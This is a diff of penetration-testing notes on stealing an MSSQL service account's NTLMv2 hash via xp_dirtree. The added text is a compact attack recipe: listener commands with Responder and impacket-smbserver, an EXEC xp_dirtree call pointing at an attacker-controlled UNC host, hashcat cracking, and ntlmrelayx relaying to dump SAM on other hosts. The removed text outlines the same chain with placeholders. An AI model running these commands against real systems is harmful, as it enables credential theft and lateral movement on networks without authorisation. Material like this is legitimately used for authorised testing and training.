@@ -1,65 +1,36 @@
-1. Establish direct connection to MSSQL or identify SQL injection in a web application.
-2. Set up a listener (Responder, WireShark, or TCPDump) on `<ATTACK_IP>` to intercept incoming traffic.
-3. Execute `xp_dirtree` targeting a UNC path on the controlled host to trigger the NTLMv2 hash leak.
-4. Capture the hash and decide between local cracking or SMB Relay to secondary targets.
+# MSSQL xp_dirtree — NTLMv2 Hash Stealing
 
----
+No CVE, no exploit — abuses Windows SMB authentication. MSSQL service account authenticates to your SMB listener when `xp_dirtree` tries to list a remote share → you capture its NTLMv2 hash.
 
-## Forced NTLMv2 Leak via xp_dirtree
+Already covered in the attacking SQL section, but the concept chain:
 
-**When to use** Direct interaction with MSSQL or SQLi in web applications on Windows hosts where you need to capture the service account hash.
+Source: attacker-controlled UNC path passed to `xp_dirtree` → Process: MSSQL queries the share → Privileges: MSSQL service account context (often high-priv) → Destination: your Responder/smbserver
 
-**Commands** Specify the function and the target network folder to initiate the authentication cycle.
+Catch with Responder:
 
-```
-xp_dirtree \\<ATTACK_IP>\<SHARE_NAME> <DEPTH>
+```bash
+sudo responder -I <IFACE>
 ```
 
-> ⚠️ **Gap**: Source mentions the function and parameters (depth, target folder) but does not provide the exact T-SQL `EXEC` syntax or specific capture tool flags.
+Or impacket-smbserver:
 
-**Tool comparison**
-
-- Responder
-    - Intercepts and displays hashes automatically
-    - Prefer for standard NTLMv2 capture and parsing
-- WireShark / TCPDump
-    - Captures raw traffic for manual analysis
-    - Prefer when automated tools fail or detailed packet inspection is required
-
-**Dangerous / misconfigured settings**
-
-- MSSQL service running with **elevated privileges** allows system command execution.
-- MSSQL server configured to allow undocumented functions like `xp_dirtree`.
-
-**Gotchas** **SMB Relay to the originating host is patched**; the captured hash must be used against other systems where the account has **local admin privileges**.
-
-## NTLMv2 Hash Exploitation
-
-**When to use** NTLMv2 hash successfully intercepted from the MSSQL service user.
-
-**Commands** Replay the hash to secondary systems for administrative access.
-
-```
-<SMB_RELAY_TOOL> -t <TARGET_IP>
+```bash
+sudo impacket-smbserver share ./ -smb2support
 ```
 
-> ⚠️ **Gap**: Source mentions the concept of SMB Relay and cracking but provides no specific tool syntax or cracking commands.
+Trigger from inside MSSQL:
 
-**Edge cases**
-
-- If SMB Relay targets lack **local admin privileges**, the attack will fail to grant system access.
-- If the password is high-entropy, **cracking on the local system** may be unsuccessful.
-
-**Gotchas** **Successful SMB Relay does not guarantee access to the original host**; use gained access on secondary hosts to pivot or steal credentials for the original system.
-
-## Alternative Command Execution
-
-**When to use** Direct command execution is required and `xp_dirtree` is insufficient.
-
-**Commands** Execute Python code within a SQL query if the environment supports it.
-
-```
-<SQL_QUERY_WITH_PYTHON_CODE>
+```sql
+EXEC master..xp_dirtree '\\<ATTACK_HOST>\share\'
+GO
 ```
 
-> ⚠️ **Gap**: Source identifies Python execution as an alternative method but provides no syntax or configuration requirements.
+Crack the captured NTLMv2:
+
+```bash
+hashcat -m 5600 <HASH_FILE> <WORDLIST>
+```
+
+Can't crack → relay with `impacket-ntlmrelayx` to any host where SMB signing is off.
+
+> [!tip] The MSSQL service account often has elevated OS privileges. Even if you can't crack the hash, relay it — if the account has local admin anywhere on the network, `ntlmrelayx` will dump SAM automatically.
